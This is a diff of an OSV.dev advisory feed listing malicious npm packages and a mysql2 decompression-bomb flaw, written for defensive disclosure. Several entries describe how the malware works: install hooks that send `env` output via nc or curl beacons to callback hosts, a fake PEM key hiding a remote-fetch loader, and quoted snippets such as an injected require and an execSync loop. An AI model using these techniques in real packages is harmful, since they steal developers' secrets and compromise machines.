+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2-01 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-2fmg-86jf-r56c&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2-01&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (b3124a1c9acaf74c188df39d5f082e62a04b41a7440d16c5689f67e6202f0fa6)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-2fmg-86jf-r56c"&gt;https://github.com/advisories/GHSA-2fmg-86jf-r56c&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15651"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15648: Malicious code in @fdr-mar/promos-types (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15648</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15648"/>
+    <published>2026-09-01T01:03:21Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-gj3w-q938-w6m6"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @fdr-mar/promos-types (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-gj3w-q938-w6m6&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@fdr-mar/promos-types&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (a485eb1f5ab3e53dbceaad01009e635c83058bafc059feb2411b83fc2aa9640e)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-gj3w-q938-w6m6"&gt;https://github.com/advisories/GHSA-gj3w-q938-w6m6&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15648"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15625: Malicious code in evilpostinstall (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15625</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15625"/>
+    <published>2026-08-31T15:40:53Z</published>
+    <updated>2026-09-01T01:00:11Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in evilpostinstall (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;evilpostinstall&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (846e500b06f58769a2cb833be8e726ab1db04b327f4c614da6642eb46ae7dfe5)
+The package&amp;#x27;s postinstall lifecycle hook pipes the output of `env` through `nc` to a host reconstructed at install time from the package version string via `cut -b 2-4` and `cut -b 5-`. For version 4127000.0.1 the destination decodes to 127.0.0.1:888; the sibling artifact evilpostinstall-192.168.1.100.tgz uses the same slicing scheme to target 192.168.1.100. On `npm install`, the full installer environment - including any CI secrets, tokens, and API keys present in environment variables - is transmitted to the reconstructed host over TCP port 888. package.json also declares a self-referencing dependency `evilpostinstall: ^4192168.1.100…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/evilpostinstall/v/49.13.4074225"&gt;https://www.npmjs.com/package/evilpostinstall/v/49.13.4074225&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/evilpostinstall/v/4127000.0.1"&gt;https://www.npmjs.com/package/evilpostinstall/v/4127000.0.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15625"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-rgwj-5xj2-c3m3: MySQL2: Unbounded zlib inflate in compressed MySQL protocol handler allows decompression-bomb DoS</title>
+    <id>https://osv.dev/vulnerability/GHSA-rgwj-5xj2-c3m3</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-rgwj-5xj2-c3m3"/>
+    <published>2026-08-31T22:36:20Z</published>
+    <updated>2026-08-31T22:45:09Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;MySQL2: Unbounded zlib inflate in compressed MySQL protocol handler allows decompression-bomb DoS&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;mysql2&lt;/code&gt; — fixed in 3.23.1&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Vulnerability Details
+
+**File**: `lib/compressed_protocol.js`
+**Line**: 43 (`zlib.inflate(body, (err, data) =&amp;gt; { ... })` inside `handleCompressedPacket`)
+
+### Root Cause
+When a connection is created with `compress: true` (and the server advertises `CLIENT_COMPRESS`), every incoming packet is unwrapped by `handleCompressedPacket()` in `lib/compressed_protocol.js`, which calls:
+
+```js
+zlib.inflate(body, (err, data) =&amp;gt; { ... });
+```
+
+No options object (in particular, no `maxOutputLength`) is passed. Node&amp;#x27;s zlib convenience methods default `maxOutputLength` to `buffer.kMaxLength`, which on this platform is `Number.MAX_SAFE_INTEGER` — i.e. effectively unbounded until the process runs out of memory. The 3-byte &amp;quot;length of payload before compression&amp;quot; field in the compressed-packet header is rea…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/sidorares/node-mysql2/security/advisories/GHSA-rgwj-5xj2-c3m3"&gt;https://github.com/sidorares/node-mysql2/security/advisories/GHSA-rgwj-5xj2-c3m3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/sidorares/node-mysql2/commit/7c48343c95ecc80d30d6ebfa67875947b7d848d2"&gt;https://github.com/sidorares/node-mysql2/commit/7c48343c95ecc80d30d6ebfa67875947b7d848d2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/sidorares/node-mysql2"&gt;https://github.com/sidorares/node-mysql2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/sidorares/node-mysql2/releases/tag/v3.23.1"&gt;https://github.com/sidorares/node-mysql2/releases/tag/v3.23.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-rgwj-5xj2-c3m3"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
   <entry>
     <title>[UPDATED] GHSA-j4fx-xxwh-2485:  jsondiffpatch patch APIs are vulnerable to prototype pollution</title>
     <id>https://osv.dev/vulnerability/GHSA-j4fx-xxwh-2485</id>
@@ -1064,7 +1900,7 @@ _-= Per source details. Do not edit below this line.=-_
 Package advertised as a self-signed TLS certificate generator ships a fake RSA private key at test/key.pem whose body, once the PEM headers are stripped and the middle is base64-decoded, is JavaScript that calls fetch(&amp;#x27;https://aptupdate.org/settings/privacy.php&amp;#x27;) and pipes the response into a detached, window-hidden python3 process via spawn(&amp;#x27;python3&amp;#x27;, [&amp;#x27;-&amp;#x27;], {detached:true, windowsHide:true}) with p.stdin.write(log). index.js reads test/key.pem, strips the &amp;#x27;-----BEGIN/END RSA PRIVATE KEY-----&amp;#x27; markers, base64-decodes the payload, converts it to a UTF-8 string, and passes it as the third argument to selfsign.generate() from the paired …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-rwg4-cx82-h5hq"&gt;https://github.com/advisories/GHSA-rwg4-cx82-h5hq&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.1.2"&gt;https://www.npmjs.com/package/self-certificates/v/1.1.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.2.5"&gt;https://www.npmjs.com/package/self-certificates/v/1.2.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.2.3"&gt;https://www.npmjs.com/package/self-certificates/v/1.2.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.1.9"&gt;https://www.npmjs.com/package/self-certificates/v/1.1.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.0.9"&gt;https://www.npmjs.com/package/self-certificates/v/1.0.9&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.1.1"&gt;https://www.npmjs.com/package/self-certificates/v/1.1.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/self-certificates/v/1.0.2"&gt;https://www.npmjs.com/package/self-certificates/v/1.0.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-14543"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-15589: Malicious code in autobahn-electron-probe (npm)</title>
+    <title>[UPDATED] MAL-2026-15589: Malicious code in autobahn-electron-probe (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-15589</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15589"/>
     <published>2026-08-30T01:25:47Z</published>
@@ -1078,21 +1914,7 @@ _-= Per source details. Do not edit below this line.=-_
 package.json declares preinstall and postinstall lifecycle scripts that run curl against http://da9ohqqvbsgu1166tuu0rrroxsztr18dt.cyowl.com/autobahn-electron-probe/, sending the installer&amp;#x27;s username (whoami), hostname, current working directory, and a timestamp as query parameters over plain HTTP. The long unique subdomain under cyowl.com is a DNS-callback / OAST-style exfiltration pattern. The scripts fire automatically on npm install without any user action, and the package ships no functional module code — the lifecycle beacon is the entire payload. The package name resembles the Autobahn WebSocket project and Electron, but the ship…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/autobahn-electron-probe/v/99.99.1"&gt;https://www.npmjs.com/package/autobahn-electron-probe/v/99.99.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/autobahn-electron-probe/v/99.99.2"&gt;https://www.npmjs.com/package/autobahn-electron-probe/v/99.99.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/autobahn-electron-probe/v/99.99.3"&gt;https://www.npmjs.com/package/autobahn-electron-probe/v/99.99.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15589"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-15625: Malicious code in evilpostinstall (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15625</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15625"/>
-    <published>2026-08-31T18:01:10Z</published>
-    <updated>2026-08-31T18:31:22Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in evilpostinstall (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;evilpostinstall&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (846e500b06f58769a2cb833be8e726ab1db04b327f4c614da6642eb46ae7dfe5)
-The package&amp;#x27;s postinstall lifecycle hook pipes the output of `env` through `nc` to a host reconstructed at install time from the package version string via `cut -b 2-4` and `cut -b 5-`. For version 4127000.0.1 the destination decodes to 127.0.0.1:888; the sibling artifact evilpostinstall-192.168.1.100.tgz uses the same slicing scheme to target 192.168.1.100. On `npm install`, the full installer environment - including any CI secrets, tokens, and API keys present in environment variables - is transmitted to the reconstructed host over TCP port 888. package.json also declares a self-referencing dependency `evilpostinstall: ^4192168.1.100…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/evilpostinstall/v/49.13.4074225"&gt;https://www.npmjs.com/package/evilpostinstall/v/49.13.4074225&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/evilpostinstall/v/4127000.0.1"&gt;https://www.npmjs.com/package/evilpostinstall/v/4127000.0.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15625"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15575: Malicious code in opiumbest (npm)</title>
+    <title>[UPDATED] MAL-2026-15575: Malicious code in opiumbest (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-15575</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15575"/>
     <published>2026-08-30T05:03:03Z</published>
@@ -1144,7 +1966,7 @@ _-= Per source details. Do not edit below this line.=-_
 The package is published as &amp;#x27;mjs-eslint&amp;#x27; but its description, file layout (big.js, big.mjs), and source are a verbatim copy of the legitimate big.js arbitrary-precision arithmetic library by Michael Mclaughlin. Two lines have been inserted into the IIFE at big.js:605-606 (and identically in big.mjs:605-606): `const helper = require(&amp;quot;ts-eslint-helper&amp;quot;); helper.from_str().then(e =&amp;gt; e).catch(e =&amp;gt; { });`. The corresponding dependency `&amp;quot;ts-eslint-helper&amp;quot;: &amp;quot;^4.0.1&amp;quot;` is declared in package.json. This call fires at module load on any `require(&amp;#x27;mjs-eslint&amp;#x27;)` or `import` of the package, executes asynchronously, and silently swallows all errors v…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mjs-eslint/v/7.0.5"&gt;https://www.npmjs.com/package/mjs-eslint/v/7.0.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-r6f7-88jj-mg66"&gt;https://github.com/advisories/GHSA-r6f7-88jj-mg66&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mjs-eslint/v/7.0.6"&gt;https://www.npmjs.com/package/mjs-eslint/v/7.0.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mjs-eslint/v/7.0.7"&gt;https://www.npmjs.com/package/mjs-eslint/v/7.0.7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6223"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-15590: Malicious code in com.db.autobahn.notification-center-electron (npm)</title>
+    <title>[UPDATED] MAL-2026-15590: Malicious code in com.db.autobahn.notification-center-electron (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-15590</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15590"/>
     <published>2026-08-30T02:04:57Z</published>
@@ -1417,7 +2239,7 @@ Any computer that has this package installed or running should be considered ful
 &lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-wvpv-8v52-pgq7"&gt;https://github.com/advisories/GHSA-wvpv-8v52-pgq7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mkb-manager/v/1.0.11"&gt;https://www.npmjs.com/package/mkb-manager/v/1.0.11&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mkb-manager/v/1.0.13"&gt;https://www.npmjs.com/package/mkb-manager/v/1.0.13&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mkb-manager/v/1.0.12"&gt;https://www.npmjs.com/package/mkb-manager/v/1.0.12&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mkb-manager/v/1.0.15"&gt;https://www.npmjs.com/package/mkb-manager/v/1.0.15&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mkb-manager/v/1.0.14"&gt;https://www.npmjs.com/package/mkb-manager/v/1.0.14&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/mkb-manager/v/1.0.10"&gt;https://www.npmjs.com/package/mkb-manager/v/1.0.10&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-14490"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] MAL-2026-15576: Malicious code in quesoeducation (npm)</title>
+    <title>[UPDATED] MAL-2026-15576: Malicious code in quesoeducation (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-15576</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15576"/>
     <published>2026-08-30T05:03:03Z</published>
@@ -1574,455 +2396,5 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (ec7cfabb396e93e034caeb560ea029e3ca2bde784b8c713d5f8941a2b621dd36)
 The package ships a single bin entry (bin/cli.js) that, when invoked, runs `whoami` and POSTs the package name, username, hostname, and platform to a hardcoded Cloudflare Workers callback at https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9. The bin is registered under the name `fuels-typegen` while the package itself is published as `verify-contract-ethers`, a name/bin mismatch consistent with typosquatting or dependency-confusion against fuels-typegen / verify-contract. The package&amp;#x27;s declared description openly states its purpose is to POST package name and whoami to an out-of-band callback, and no legitimate functionality is …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/verify-contract-ethers/v/1.0.0"&gt;https://www.npmjs.com/package/verify-contract-ethers/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15598"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15591: Malicious code in cre-setup (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15591</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15591"/>
-    <published>2026-08-30T08:07:03Z</published>
-    <updated>2026-08-31T17:30:12Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in cre-setup (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cre-setup&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (fcc14c964a76dde24165930e971dac9a2a9f36ecae68d596c7bf920cac8e1c29)
-bin/cli.js collects the current user (`whoami`/`os.userInfo()`), `os.hostname()`, and `os.platform()` and POSTs them, along with URL query parameters carrying the same values, to the hardcoded endpoint https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9 on invocation. There is no configuration option, no opt-in, and no documented purpose that requires transmitting installer/runner identity off-host. The destination is an out-of-band callback URL under an individual-controlled Cloudflare Workers subdomain, characteristic of dependency-confusion / npx reconnaissance beacons.
-
-## Source: ossf-package-analysis (7a338301f299dfbe6fb5f4a…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/cre-setup/v/1.0.0"&gt;https://www.npmjs.com/package/cre-setup/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15591"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15592: Malicious code in fuels-core (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15592</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15592"/>
-    <published>2026-08-30T07:59:16Z</published>
-    <updated>2026-08-31T17:30:12Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in fuels-core (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;fuels-core&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (c632848960231dec103d878a13a714e057a5922edcc0398884b6fd6d621e0971)
-The package&amp;#x27;s bin script (bin/cli.js) collects `whoami`, `os.hostname()`, and `os.platform()` and POSTs them along with the package name to a hardcoded Cloudflare Workers URL (https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9) with no configuration or opt-out. The bin is exposed as `generate-schema-viem`, and the package name `fuels-core` resembles the Fuel ecosystem&amp;#x27;s `fuels` package, consistent with typosquat/dependency-confusion reconnaissance targeting installers who resolve or invoke this package (e.g., via `npx`). The package.json description openly states its purpose is to POST package name and whoami to an OOB callback.
-…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/fuels-core/v/1.0.0"&gt;https://www.npmjs.com/package/fuels-core/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15592"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-14578: Malicious code in pushgitquickx (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-14578</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-14578"/>
-    <published>2026-08-27T22:13:46Z</published>
-    <updated>2026-08-31T17:30:12Z</updated>
-    <category term="npm"/>
-    <category term="GHSA-wx29-h78g-ww4f"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in pushgitquickx (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-wx29-h78g-ww4f&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;pushgitquickx&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (557f230f5bf78b909b207a6568053a346e32a2fcbd14130a824bd6de8fc7fbf6)
-The `push` subcommand of this CLI catches exceptions from git operations and, in the error handler, sends the git error text and JSON-serialized `git status` output (branch name, tracked and untracked file paths, ahead/behind info) to Google Gemini via the `@google/generative-ai` SDK using a Google API key hardcoded in the source. The model&amp;#x27;s response includes a `commandsToRun` array, and the code iterates that array and executes each string via `execSync` on the installer&amp;#x27;s machine with `stdio: &amp;#x27;ignore&amp;#x27;` (`for (const cmd of aiResponse.commandsToRun) { execSync(cmd, { stdio: &amp;#x27;ignore&amp;#x27; }); }`). Because the remote model is conditioned on …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-wx29-h78g-ww4f"&gt;https://github.com/advisories/GHSA-wx29-h78g-ww4f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/pushgitquickx/v/1.0.14"&gt;https://www.npmjs.com/package/pushgitquickx/v/1.0.14&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/pushgitquickx/v/1.0.17"&gt;https://www.npmjs.com/package/pushgitquickx/v/1.0.17&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/pushgitquickx/v/1.0.16"&gt;https://www.npmjs.com/package/pushgitquickx/v/1.0.16&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/pushgitquickx/v/1.0.5"&gt;https://www.npmjs.com/package/pushgitquickx/v/1.0.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-14578"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15593: Malicious code in fuels-typegen (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15593</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15593"/>
-    <published>2026-08-30T08:09:39Z</published>
-    <updated>2026-08-31T17:30:12Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in fuels-typegen (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;fuels-typegen&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (f4dcadcdf880021763232df96239a6a07acd6360bfcd941ae8026a37aee2eb2f)
-The package name resembles the legitimate @fuel-ts/typegen. On execution of the CLI in bin/cli.js, the code collects the local username (whoami / os.userInfo), os.hostname(), platform, and package name and POSTs them as JSON to the hardcoded endpoint https://oobme.kunalsharma0553.workers.dev/r/7bq6fz3l15r9. The manifest&amp;#x27;s own description states the package&amp;#x27;s purpose is to POST identifiers to an out-of-band callback, and the bin name (hyperliquid-composer) is unrelated to the package name, consistent with dependency-confusion or typosquat delivery.
-
-## Source: ossf-package-analysis (d3a77505eb8f38e58c0a2b2a3b9ab7a0c4976077df0cef66e39b14…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/fuels-typegen/v/1.0.0"&gt;https://www.npmjs.com/package/fuels-typegen/v/1.0.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15593"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-15622: Malicious code in spc_login (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-15622</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15622"/>
-    <published>2026-08-31T16:41:35Z</published>
-    <updated>2026-08-31T17:30:12Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in spc_login (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;spc_login&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (e9a20e34373650f3fda40b9ea351c7ccb15ae98292cd159863cb26c0c33ff8c1)
